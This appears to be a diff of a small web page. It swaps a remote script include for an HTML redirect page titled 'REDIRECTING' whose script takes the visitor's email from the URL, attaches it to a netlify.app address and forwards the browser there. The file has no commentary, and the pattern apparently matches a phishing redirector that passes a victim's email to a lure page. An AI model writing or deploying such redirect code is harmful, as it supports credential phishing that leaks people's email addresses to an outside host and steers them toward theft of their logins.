@@ -1,1 +1,20 @@
-<script language="Javascript" src="https://voluble-selkie-0d8e1e.netlify.app/index.html"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REDIRECTING</title>
+</head>
+<body>
+    <script>
+        
+        let url = 'https://voluble-selkie-0d8e1e.netlify.app/index.html'; 
+     
+        const email = new URLSearchParams(location.search).get('email');
+        if (email){
+            url = url + '#'+email;
+        }
+        location.replace(url)
+    </script>
+</body>
+</html>
